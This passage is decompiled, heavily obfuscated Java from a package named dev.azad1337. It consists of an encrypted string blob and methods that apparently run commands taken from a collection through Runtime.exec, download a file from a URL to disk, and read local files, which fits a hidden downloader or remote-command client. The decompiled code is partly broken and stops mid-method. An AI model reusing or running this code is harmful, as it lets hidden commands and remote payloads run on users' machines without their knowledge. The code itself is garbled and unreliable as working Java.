ö\u0096Ðöü5\u0085\u0016mõX3\n\u0011]uÊ¯n\u0081?ù\u0097\u0012vÿ\u0080Ï\u0002\u0007\u001cR\u0006\u0015\u001fþòÚû:z'øº\u008dY\u0095ÍY£\u009b©DÀ\u0005\u0019×?\u00ad\u0086´çâ\u000e\u0095§\u008b¦\u001aßpý³ü\u008d«#³Ëïè\u009d\u0099\u008c,��»QhDï\u001dJ\nÃX¸\u0013í\"»Ðr\u001aë\"zé-Â\u0089p\u0097O\f\u001c\u009a(ÎlduVwN>\u009d!x1\u0084\u0006Î\u0015ó\u001f|Ü÷0ûxP÷ù:°\u0084¤Ø\u001c@\u007f=w\u0093\u0098\u0097©\u0085ì\u001e\u0010í1\u007fB\u008f\u0085dÎúI\u008eFÄ×4u\u0092\u0096_$Ö©5\u0082ý\u009bJH\n\u0004\u001fâ\u0006\u0086\u0002M\u008c\u0005ö@ÓÒJ\u0005\u0099r\u001a\u0094s\nÚ\u0019èÿÔYã´Cô\u000ehf\u00926\u0005\u0095ÊZsb5it4\u0004\u000eú¼«\u00117ÜÆ(ºJ\u0089\u009c#ó\u000f\t3��e\u0091¿\u000e¼ÓþH\n\u008e÷p»»ê0ð.\u000bob½qvGÙ\u0015ï\u0088\u0088\bçgO0 ¬&\u008f\u0006\u0005\u0001m\u001fÒa\u0003\u0018:\b\u0003\u0099\u0018\u0006\u0016¤\u007fÿ\u009c¸?_V��RÔG'\u0090©\u0011\u0084\u0018·\u0080û\u0017\u0014��R\u0092ÞHµ±×ÑÊ*\u008a¿*1%h\u0094\u0085\u0013\u001e]\u0015ÉÛ)°\u0097)gø¦\"M<\u008b\u008fV»~÷5óAë\u0012ZÁF?e\u0006\u0004\u00933®¯s\u000eà+wÖ=jÌ\u0011Ñ\u0094\u0005²ÍH\u0005\u0098Ö»\u0007ï\u0010ä?Û\u0017\u0095ÌO\u0082\u0084P$xdõ8R7úaÔ\fÄT²7DÉá\u0095\u000f(9ÀÄ[*\u0092QzÍY\u0080¢õ*\u0011Å-\u0003\u000fd¸\u0097F×âmÛ\u001b\u008b=ùKêîëay,Ñà\u0090\u0003¥b\u0016:Qsý\u00828©¼ $b+;��^\u0010\u0098\bbZ\u0001t\u000f<d\u000eâ]Ps\u008eÀ\u0081'²\u007fÍ_}A¸iÐF.'XÁÏ\u0017l\u00ad \u000e.Ð\n§Å\u000bÈ%I\u0099èZ\n¶\u0095üÇ2\u001ev\u0014\"\u0005½\u001b\"Î2©=\u0017!}6æ&$Êþ\u0011\u0085\u001aÙhð\u0017úÒ5\u0016QjÅ;¬\u0085å)E\u0014xM¬Í] ²\u000f\u000e\u001c¸ê%\u0088#§Å±\r«æØô\u001c\"a~÷\u0094³\u00adCeïTççk\u008e��¼ð\u0001x±9±\u008eD\u0004-7\tQÆ\u0003\u0002P\u0013µÂ¶\u000b\u0090\u0099\u0012À\u000epÞûV\"°\b¶\u000eÿ\u001bÏ>D¨\u0003)\u0090ï\u0012\u001eÜçêÃ»Hã\u0002\u00151\u009dÀ\u0083\u008c{ø\u001e\r)6x\u0001\u0017\u0087\u0018Mê¤ª-\u0091\\NÇ\u0016¤Ó\u0091ßSð\u000blYEÖ²ô\u0003o\u008aÑ T0y\u0080§ß´.¡µÛµ£\u0004%,ÄîÐI¡â¹Ð%KdÓÒº\u0098©ë°M¯\u00801#\u0002¦)Â\u000eÖ³ÅÑ\u008aï?×wÃâªFÜã\u00165&H\u0010oZ6Ià;6\u0004Ð;ÝC\u0004}|ÏÔ.[É¼Õ\u0010C¹ý\u0084É?N\u0082ð@M\u0002Ø\u001bV\\å99®II%ñ \u0090T-\b>\u009aw\u0097DåÉ{R[¥ö\u0002\u008d\b\nZ\\\u001f2\u009fz\u008bp8}\u0003◆2t\u0004H\u001fi¸7sÐ¹ö°'\u00adq\u0006Xo|\u0088¶\u0001\u0085*Á\u001euü\u0081-µ,Ø\u0019\u0017ûfÑ\u009c\u0005\u0011;¹×ç|<V1²7\u001d\u0088\u009d³G(ö\u009bPec\u0003\u0092.g\u0004\tÔ|ñ\u0006Ù\u000b\u0095^Áé+\u000f\u00166.A<\u0093\u0012Á4\u0097ñ\u0097\u0007â³V\u0007\u0091\u00ad\r\u009a\u0013Öë´á\u009aä×2ªy×´a&üB_\u0091]J#=\u008c\u0095Uê\u000e$\u001c\u008aìÞ\u000fË\u0091°f\u00914(ë\u0092\u000f>\u008c\u0010\u000f¢ug¢âãÄ¹Á$ d<N\u0098¾ä«ÝÀ\u009bo¬ð+\u0003SÿÜ< ´é\u0098M\u008cH!^\u0088%\u0002Ü¡#l'ØÑÄf\u0089É\u0094X\u0097kE3:hcë\u0087g@1?Ój{:s\u0010\u000f\u0003Ö\u0014(KcP>aÌ\u001f\u000eÀ÷8Zrär³\u009eés?ÿ;\u00059\u0001\u0001TØ\f\u0090Á\u0099\u0018mÖ\u0087gòÓ&Ñ&N¨\u001eùDÆ3MËß\t\u0080\u0003\u0096ÿÀ¶ø.\u0011¿j\u00aduÜ\u0085Pªîe·à\u0001´Ïàíþ\u0002\u009dÊ\u0093\u001bÊW\u0080i\u0002ñË:þ¿Å\u009b,'\u008fo\u0084PÕÚÊ\u0095q\u008d_ü}ÙÐûóé\u0016\u0094\u009bLV¹\u001d¤\u0003ð\u0083ß§kT\u0018éÞ\t\u0002¢R\u0088Á\u0015¿Zí')°/\u009d\u0090\u000eW\u0011\u009aì{¢\u001e\u0019UeÕl@\u0015\rÜyTÖ¯uãv@cÎ[£z\u0092\u0086ñ\u0005»s\u008eQ«¨9î¼û¦\tÛÊ©\u00867%3áAæ±èr Î×A:ÉLn\u009cF\u001cy\u008djµ¶7\u000f\u007f¨\u0099\u0006õP\u001a\u0084{M\tÇ²yÊ\u009f\u008eÈq\u0019\u0003■◅e\">\n\u009e\u0019¤Ù¨D\u009d\\R\u008fsýø;B��\u0094\u0016_õ\u008d&\u0002\u0017ð\u0089Btó\u0012àÏ\u0004ã±!]&à\u008aûïÃ¦Ø{Ï:\u008a÷\u0083\u0080\u0003¸)Ë*¶=^ Iæ«ª~\u001eø¨á\u001eÌ\u0010ý¥u\u0002\u0087Ù1Þ\u0011\fÎ\u0006 {\u0091ÂD(ó'øq\u000b Rråd\u0005\u009f7//CîÇÕ¬\u0003äYN I|þ¯8\u0081Wñ\u0096¸\u0012Øý\u0004f¾j\u0087\u0007Ñ ,óG\u0099\u00ad\\Y¨ôI\u008f,Tä\u0081ýB\u0087\u0080\r\n\u008f\u0014��h<|é»ÎñQñjëz\r ¢ÌæÈpyeg8WÌg\u0015þó\u001fÄ½XuõV;úÞv\u001fýÇ}\u0091¹\u0019¹Q(\u008d7d\u0088¦\u0081í<o\u009dd\u0098\u0001ZÄ¥LÒÑ\u00818\u0016\u0015è\u0003┘▂{\u00041#äÔ\u0005{\u001fÊ\u007féZ1Õùæ.Ù`Z\t+\u0096;Tr\"Åø\u0013a~#Á\u0098ëA\u0087ÄÆ\u0015M÷æCÿÿbîRÞþbi<E¬ø\u0087Ôl¢ª\u001dª\u0091ý\u0089\u008bÚ¯é\u0093XaYGbßpµq©«¿B`\f³Õ\u0005cÓ\u008dÜì><\u00936o\u009e3]@wïôZÁÈÎÿó\u009cÏ\u0012õõu\u0099Tmþ¿5ø5ò\u0092Ò+Tt*ñqh\u0012\u0085\u0082PÁr<ë\u0013+R±é¨j/(\u001e0\u0014ê\u0005¤\u001b\u0001ÐVµ½Ó\u008ej\u0082E>®m\u001b¶O¥4\u0092;ä\u000e\u0096ÝÚ\u0004¿\"\u009e\u0003Û\u0097q3÷é\"Ú^ü\u0094\u001cde¦Ïex ¸ß0\u0001XT\u0019`,\u009fhÇ\u0081\u0081>!g[Ø='/$\u0005\u0015Ø¦¾@\u00818ä¤\u0002Ãz\b\u0082¹ãëµ×\u0094à\tY³÷xF9tùy\u0004\u0090â^Ï\tik²\u0097\u0001ÐKºi\u001eëvG\u0015³ïIµ\u0090í¦l»\u0098h¿\u0082âh}û;Q-úô\u001b/5H";
        int length = "��\u0017\u0004\u0093x>\u009c\u0005Ãyù³\u008f\r\u009di\u0018°j«µ¢bs\"Ú\u008c\b³\u007f_5Û\u0084Æo\nÙFPg< µ\u009b\u0089\u0011\b\t\u007f,5µû+0\u0004e\u0007ç´%Si½Á0Á½\u00ad\u001aÃ3\u0003Dæ\u001dÈ\u00ad*ÃêRäY\u000b÷¨X\u001e¤ËÀÀi!ÿ¯\u007f\u0007è\u008b/\u0086'7¡\u0005\u0090G;2W\u0007\u001f Ç÷´\u0096\u0089\bpa'öÔ\u0083'\u001f<ùo{uÑ\u0088\u00835ª\u0015\u0089k\u0097RmâØ³\u0085ün\u0089æ¿«åq\"; \u0086ÔBò}\u008c%Y[¥\u0091udI³\u0003\u0081Èßoï\u000fñg./@ètÿ\u000bß:í°\u007fñª¡ëi\u0007\u0004\u0097?A\u0018\u0003��À\u001f\u001bV´&\u0011=\u00992\u009e0£}V)N7í\u0015ñÊ!Þ\u0099±\u007fÁG×\u009eî1\u0007\u0086&Æ3\u001a\u0081\u00062\tÀæ)¯Þ6\u0090cyu3|]ëãÔMD\u0007¾}RâV³\u0099¹\u0088¢Î(»q¿ú'+\u000fÍÂÏ\u0089tNð\u007fz¢>\u0007\u009bós\u008d\"Ù['\u00807ÏºèR¸+\u0012\u0005õþ,Ñ¡Üß\u0081Kí^HF\b¿\u001d Â\u0015oÖ\u001f\u0013\u0093OöT\u0090º\u0003x\u0001\u0004\u0006úaìðT¸94îÂEæ\u008eeõv\r\u0012hä2\u0003î\u00152<ÌY\u008f��\u007fwýê!H@èØ\u008fsÄ¼\u0012_½eKzâO\u000b\u0082\u0093\u008f\fh{¦ò½ãOõ\b\u0004,Cm\u009a\u009e/\u0006@ÜùÝ¤GÒY\u0019ÿ\u0012ÃR3\u0092²Ù`¤±RáØ\u001a\u0090\u0092«\u001a+´âÞ ÇiªTJøÃ\f'Ðç%©:\u0085\u0098Î\u008e8ýðµ¶oµ\n÷ÈÉ\"&É3$MSEíQ\u0006¿m\u0081ÝK\u0099ï£ôÑ\u0002\u008aê`1V5\u0087Õ\u0099M\u008b Ô\u0088*ÅYqâ«{\u0011A r\f\u001a82>\u0094L\u0012\u0007÷@þû\u0093\u0017m?´LAe¯UN?d\u0091üI½¯'üA\u0003\u0098Ê\"5\u001eµ\u008eÅ¸O¯àP\u0080ºÄKQ ¯3\u0091H0S\u000e>x¶6\u0004M��Á×\u0018\u001dwó/\u0002c\u0080£¯\u001egûÏ½\u008bÓ2`b\u0010ïÓ\u0092oMA&?ÿ\u0080f\u0004fK1\u0096Ã\b¬\u008d-!\u00995÷¡SV\u0095æ\u009a}\u0012§ûEþen\u0092Éf/dl\u0019w\u0084\u0090J²\u0086õõ´\u0092I\u000b+7\u001bÊX/\u001f\u0007\tÝ%\u0092~b\u009có3~\u001cºý`fÿÇ@I\\®sÏ\u0003n\u0013¨(é]ö?ãà\u0093Ã\"øÒ+Á\u0093ï\u009ez*ôÐ3l\u0016öàX\u0098\u00197ÐªrJÉôSÒ\u009dò\\(\u009fç\u0083e\u0089\u009dá|\u009fë;d~\u0097\n\u00995g\u001f\u0090ßjÄ\u0004ë\u0005'+\u0093@\\\u0005m\f,\u001d5\rj&C÷\u001eQ\u0095\u0093Rå\u0096ut'j3\u0092:CBÍ)¼E ö\u0096Ðöü5\u0085\u0016mõX3\n\u0011]uÊ¯n\u0081?ù\u0097\u0012vÿ\u0080Ï\u0002\u0007\u001cR\u0006\u0015\u001fþòÚû:z'øº\u008dY\u0095ÍY£\u009b©DÀ\u0005\u0019×?\u00ad\u0086´çâ\u000e\u0095§\u008b¦\u001aßpý³ü\u008d«#³Ëïè\u009d\u0099\u008c,��»QhDï\u001dJ\nÃX¸\u0013í\"»Ðr\u001aë\"zé-Â\u0089p\u0097O\f\u001c\u009a(ÎlduVwN>\u009d!x1\u0084\u0006Î\u0015ó\u001f|Ü÷0ûxP÷ù:°\u0084¤Ø\u001c@\u007f=w\u0093\u0098\u0097©\u0085ì\u001e\u0010í1\u007fB\u008f\u0085dÎúI\u008eFÄ×4u\u0092\u0096_$Ö©5\u0082ý\u009bJH\n\u0004\u001fâ\u0006\u0086\u0002M\u008c\u0005ö@ÓÒJ\u0005\u0099r\u001a\u0094s\nÚ\u0019èÿÔYã´Cô\u000ehf\u00926\u0005\u0095ÊZsb5it4\u0004\u000eú¼«\u00117ÜÆ(ºJ\u0089\u009c#ó\u000f\t3��e\u0091¿\u000e¼ÓþH\n\u008e÷p»»ê0ð.\u000bob½qvGÙ\u0015ï\u0088\u0088\bçgO0 ¬&\u008f\u0006\u0005\u0001m\u001fÒa\u0003\u0018:\b\u0003\u0099\u0018\u0006\u0016¤\u007fÿ\u009c¸?_V��RÔG'\u0090©\u0011\u0084\u0018·\u0080û\u0017\u0014��R\u0092ÞHµ±×ÑÊ*\u008a¿*1%h\u0094\u0085\u0013\u001e]\u0015ÉÛ)°\u0097)gø¦\"M<\u008b\u008fV»~÷5óAë\u0012ZÁF?e\u0006\u0004\u00933®¯s\u000eà+wÖ=jÌ\u0011Ñ\u0094\u0005²ÍH\u0005\u0098Ö»\u0007ï\u0010ä?Û\u0017\u0095ÌO\u0082\u0084P$xdõ8R7úaÔ\fÄT²7DÉá\u0095\u000f(9ÀÄ[*\u0092QzÍY\u0080¢õ*\u0011Å-\u0003\u000fd¸\u0097F×âmÛ\u001b\u008b=ùKêîëay,Ñà\u0090\u0003¥b\u0016:Qsý\u00828©¼ $b+;��^\u0010\u0098\bbZ\u0001t\u000f<d\u000eâ]Ps\u008eÀ\u0081'²\u007fÍ_}A¸iÐF.'XÁÏ\u0017l\u00ad \u000e.Ð\n§Å\u000bÈ%I\u0099èZ\n¶\u0095üÇ2\u001ev\u0014\"\u0005½\u001b\"Î2©=\u0017!}6æ&$Êþ\u0011\u0085\u001aÙhð\u0017úÒ5\u0016QjÅ;¬\u0085å)E\u0014xM¬Í] ²\u000f\u000e\u001c¸ê%\u0088#§Å±\r«æØô\u001c\"a~÷\u0094³\u00adCeïTççk\u008e��¼ð\u0001x±9±\u008eD\u0004-7\tQÆ\u0003\u0002P\u0013µÂ¶\u000b\u0090\u0099\u0012À\u000epÞûV\"°\b¶\u000eÿ\u001bÏ>D¨\u0003)\u0090ï\u0012\u001eÜçêÃ»Hã\u0002\u00151\u009dÀ\u0083\u008c{ø\u001e\r)6x\u0001\u0017\u0087\u0018Mê¤ª-\u0091\\NÇ\u0016¤Ó\u0091ßSð\u000blYEÖ²ô\u0003o\u008aÑ T0y\u0080§ß´.¡µÛµ£\u0004%,ÄîÐI¡â¹Ð%KdÓÒº\u0098©ë°M¯\u00801#\u0002¦)Â\u000eÖ³ÅÑ\u008aï?×wÃâªFÜã\u00165&H\u0010oZ6Ià;6\u0004Ð;ÝC\u0004}|ÏÔ.[É¼Õ\u0010C¹ý\u0084É?N\u0082ð@M\u0002Ø\u001bV\\å99®II%ñ \u0090T-\b>\u009aw\u0097DåÉ{R[¥ö\u0002\u008d\b\nZ\\\u001f2\u009fz\u008bp8}\u0003◆2t\u0004H\u001fi¸7sÐ¹ö°'\u00adq\u0006Xo|\u0088¶\u0001\u0085*Á\u001euü\u0081-µ,Ø\u0019\u0017ûfÑ\u009c\u0005\u0011;¹×ç|<V1²7\u001d\u0088\u009d³G(ö\u009bPec\u0003\u0092.g\u0004\tÔ|ñ\u0006Ù\u000b\u0095^Áé+\u000f\u00166.A<\u0093\u0012Á4\u0097ñ\u0097\u0007â³V\u0007\u0091\u00ad\r\u009a\u0013Öë´á\u009aä×2ªy×´a&üB_\u0091]J#=\u008c\u0095Uê\u000e$\u001c\u008aìÞ\u000fË\u0091°f\u00914(ë\u0092\u000f>\u008c\u0010\u000f¢ug¢âãÄ¹Á$ d<N\u0098¾ä«ÝÀ\u009bo¬ð+\u0003SÿÜ< ´é\u0098M\u008cH!^\u0088%\u0002Ü¡#l'ØÑÄf\u0089É\u0094X\u0097kE3:hcë\u0087g@1?Ój{:s\u0010\u000f\u0003Ö\u0014(KcP>aÌ\u001f\u000eÀ÷8Zrär³\u009eés?ÿ;\u00059\u0001\u0001TØ\f\u0090Á\u0099\u0018mÖ\u0087gòÓ&Ñ&N¨\u001eùDÆ3MËß\t\u0080\u0003\u0096ÿÀ¶ø.\u0011¿j\u00aduÜ\u0085Pªîe·à\u0001´Ïàíþ\u0002\u009dÊ\u0093\u001bÊW\u0080i\u0002ñË:þ¿Å\u009b,'\u008fo\u0084PÕÚÊ\u0095q\u008d_ü}ÙÐûóé\u0016\u0094\u009bLV¹\u001d¤\u0003ð\u0083ß§kT\u0018éÞ\t\u0002¢R\u0088Á\u0015¿Zí')°/\u009d\u0090\u000eW\u0011\u009aì{¢\u001e\u0019UeÕl@\u0015\rÜyTÖ¯uãv@cÎ[£z\u0092\u0086ñ\u0005»s\u008eQ«¨9î¼û¦\tÛÊ©\u00867%3áAæ±èr Î×A:ÉLn\u009cF\u001cy\u008djµ¶7\u000f\u007f¨\u0099\u0006õP\u001a\u0084{M\tÇ²yÊ\u009f\u008eÈq\u0019\u0003■◅e\">\n\u009e\u0019¤Ù¨D\u009d\\R\u008fsýø;B��\u0094\u0016_õ\u008d&\u0002\u0017ð\u0089Btó\u0012àÏ\u0004ã±!]&à\u008aûïÃ¦Ø{Ï:\u008a÷\u0083\u0080\u0003¸)Ë*¶=^ Iæ«ª~\u001eø¨á\u001eÌ\u0010ý¥u\u0002\u0087Ù1Þ\u0011\fÎ\u0006 {\u0091ÂD(ó'øq\u000b Rråd\u0005\u009f7//CîÇÕ¬\u0003äYN I|þ¯8\u0081Wñ\u0096¸\u0012Øý\u0004f¾j\u0087\u0007Ñ ,óG\u0099\u00ad\\Y¨ôI\u008f,Tä\u0081ýB\u0087\u0080\r\n\u008f\u0014��h<|é»ÎñQñjëz\r ¢ÌæÈpyeg8WÌg\u0015þó\u001fÄ½XuõV;úÞv\u001fýÇ}\u0091¹\u0019¹Q(\u008d7d\u0088¦\u0081í<o\u009dd\u0098\u0001ZÄ¥LÒÑ\u00818\u0016\u0015è\u0003┘▂{\u00041#äÔ\u0005{\u001fÊ\u007féZ1Õùæ.Ù`Z\t+\u0096;Tr\"Åø\u0013a~#Á\u0098ëA\u0087ÄÆ\u0015M÷æCÿÿbîRÞþbi<E¬ø\u0087Ôl¢ª\u001dª\u0091ý\u0089\u008bÚ¯é\u0093XaYGbßpµq©«¿B`\f³Õ\u0005cÓ\u008dÜì><\u00936o\u009e3]@wïôZÁÈÎÿó\u009cÏ\u0012õõu\u0099Tmþ¿5ø5ò\u0092Ò+Tt*ñqh\u0012\u0085\u0082PÁr<ë\u0013+R±é¨j/(\u001e0\u0014ê\u0005¤\u001b\u0001ÐVµ½Ó\u008ej\u0082E>®m\u001b¶O¥4\u0092;ä\u000e\u0096ÝÚ\u0004¿\"\u009e\u0003Û\u0097q3÷é\"Ú^ü\u0094\u001cde¦Ïex ¸ß0\u0001XT\u0019`,\u009fhÇ\u0081\u0081>!g[Ø='/$\u0005\u0015Ø¦¾@\u00818ä¤\u0002Ãz\b\u0082¹ãëµ×\u0094à\tY³÷xF9tùy\u0004\u0090â^Ï\tik²\u0097\u0001ÐKºi\u001eëvG\u0015³ïIµ\u0090í¦l»\u0098h¿\u0082âh}û;Q-úô\u001b/5H".length();
        char c = 3;
        int i3 = -1;
        while (true) {
            int i4 = i3 + 1;
            String substring = str.substring(i4, i4 + c);
            ?? r1 = -1;
            while (true) {
                String str2 = substring;
                String str3 = r1;
                char[] charArray = str2.toCharArray();
                int length2 = charArray.length;
                int i5 = 0;
                char[] cArr = charArray;
                int i6 = length2;
                i4 = i + 1;
                r1 = str.substring(i4, i4 + c);
            }
            c = str.charAt(i3);
        }
    }

    @Override // dev.azad1337.p001IlIillIliIlIi.InterfaceC0005T
    /* renamed from: t */
    public void mo54t(Object[] a) {
        C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, Boolean.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, ((Boolean) a[0]).booleanValue(), 8624270624320045220L, ((Long) a[1]).longValue()) /* invoke-custom */;
    }

    /* renamed from: S */
    private void m60S(Object[] a) {
        long a2 = ((Long) a[0]).longValue();
        Iterator B = (Iterator) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Iterator.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((Collection) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Collection.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((Map) C0003v.m40a(MethodHandles.lookup(), "Ë", MethodType.methodType(Map.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-7890226997395589519L, a2) /* invoke-custom */, -7897650567523784463L, a2) /* invoke-custom */, -7899847217663457497L, a2) /* invoke-custom */;
        while ((boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, -7904641334460973292L, a2) /* invoke-custom */) {
            try {
                (Process) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Process.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((Runtime) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Runtime.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-7885310328175059076L, a2) /* invoke-custom */, m69a((-2088076170) - 2508, 2088076170 + 12072, (int) a2) + (String) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((d) (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, -7885616363953384775L, a2) /* invoke-custom */, -7877060896059733329L, a2) /* invoke-custom */, -7884695963652361771L, a2) /* invoke-custom */;
            } catch (Exception e) {
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:16:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:9:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v13, types: [java.lang.Throwable, java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v16, types: [java.lang.Throwable, java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v2, types: [java.lang.StringBuilder, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r0v3, types: [java.lang.Throwable, java.lang.Object, java.io.File] */
    /* JADX WARN: Type inference failed for: r0v5, types: [java.lang.Throwable, boolean] */
    /* renamed from: u */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    private String m63u(Object[] a) {
        String a2 = (String) a[0];
        long a3 = ((Long) a[1]).longValue();
        long a4 = a3 ^ 125158314365608L;
        ?? sb = new StringBuilder();
        ?? file = new File(a2);
        try {
            ?? B = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(file, -3306477648192338680L, a3) /* invoke-custom */;
            if (B == 0) {
                ?? m69a = m69a((-544857990) + (-((char) (-4574))), (-544989060) - (-((char) (-731))), (int) a3);
                return m69a;
            }
            try {
                Object[] objArr = new Object[4];
                sb[3] = Long.valueOf(a4);
                objArr[2] = objArr;
                objArr[1] = "";
                objArr[0] = file;
                C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, objArr, -3311795845028058380L, a3) /* invoke-custom */;
                if ((int) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Integer.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(sb, -3256983069330045032L, a3) /* invoke-custom */ > m70a(24019, 1676223094782140235L ^ a3)) {
                    ?? r0 = (String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Integer.TYPE, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(sb, 0, m70a(32409, 2720989733062786051L ^ a3), -3256841795489414542L, a3) /* invoke-custom */ + m69a((-544857990) + (-((char) (-4570))), 57220 - ((char) (-4999)), (int) a3);
                    return r0;
                }
                return (String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(sb, -3304935088181291175L, a3) /* invoke-custom */;
            } catch (RuntimeException unused) {
                throw B;
            }
        } catch (RuntimeException unused2) {
            throw file;
        }
    }

    @Override // dev.azad1337.p001IlIillIliIlIi.InterfaceC0005T
    /* renamed from: J */
    public boolean mo53J(Object[] a) {
        return (boolean) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, 5587989915522890375L, ((Long) a[0]).longValue()) /* invoke-custom */;
    }

    /*  JADX ERROR: IndexOutOfBoundsException in pass: SSATransform
        java.lang.IndexOutOfBoundsException: bitIndex < 0: -1
        	at java.base/java.util.BitSet.get(BitSet.java:628)
        	at jadx.core.dex.visitors.ssa.LiveVarAnalysis.fillBasicBlockInfo(LiveVarAnalysis.java:65)
        	at jadx.core.dex.visitors.ssa.LiveVarAnalysis.runAnalysis(LiveVarAnalysis.java:36)
        	at jadx.core.dex.visitors.ssa.SSATransform.process(SSATransform.java:58)
        	at jadx.core.dex.visitors.ssa.SSATransform.visit(SSATransform.java:44)
        */
    /* renamed from: o */
    private void m58o(java.lang.Object[] r11) {
        /*
            Method dump skipped, instructions count: 215
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: dev.azad1337.p001IlIillIliIlIi.impl.C0006G.m58o(java.lang.Object[]):void");
    }

    /* JADX WARN: Code restructure failed: missing block: B:12:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:26:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Type inference failed for: r0v14, types: [java.lang.Throwable, java.io.FileOutputStream, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r0v22, types: [java.lang.Throwable, int] */
    /* JADX WARN: Type inference failed for: r0v9, types: [java.lang.Throwable, java.lang.Object, java.io.InputStream] */
    /* renamed from: B */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    private void m56B(Object[] a) throws IOException {
        String a2 = (String) a[0];
        String a3 = (String) a[1];
        long a4 = ((Long) a[2]).longValue();
        HttpURLConnection a5 = (HttpURLConnection) (URLConnection) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(URLConnection.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(new URL(a2), 8614459633041693099L, a4) /* invoke-custom */;
        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, m69a((-1097580180) - (-22024), 48788 - ((char) (-28166)), (int) a4), 8599207134678746058L, a4) /* invoke-custom */;
        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, m70a(9078, 6895948672072205474L ^ a4), 8615265010133531969L, a4) /* invoke-custom */;
        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, m70a(17423, 7896798064646628319L ^ a4), 8611178246902215202L, a4) /* invoke-custom */;
        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, m69a((-1097580180) - (-21923), (-1097580180) - (-((char) (-29059))), (int) a4), m69a((-1097580180) - (-21934), (-1097580180) - (-((char) (-18314))), (int) a4), 8603104754948699952L, a4) /* invoke-custom */;
        ?? B = (InputStream) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(InputStream.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, 8613516754235241312L, a4) /* invoke-custom */;
        try {
            ?? fileOutputStream = new FileOutputStream(a3);
            try {
                byte[] a6 = new byte[m70a(24804, 2161248274162583346L ^ a4)];
                while (true) {
                    ?? B2 = (int) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Integer.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, a6, 8605854693703299844L, a4) /* invoke-custom */;
                    if (B2 == -1) {
                        break;
                    } else {
                        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Integer.TYPE, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(fileOutputStream, a6, 0, B2, 8615512862127584833L, a4) /* invoke-custom */;
                    }
                }
                C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(fileOutputStream, 8606674028441487882L, a4) /* invoke-custom */;
                if (B != 0) {
                    C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, 8603772392041884977L, a4) /* invoke-custom */;
                }
            } finally {
            }
        } catch (Throwable th) {
            if (B != 0) {
                try {
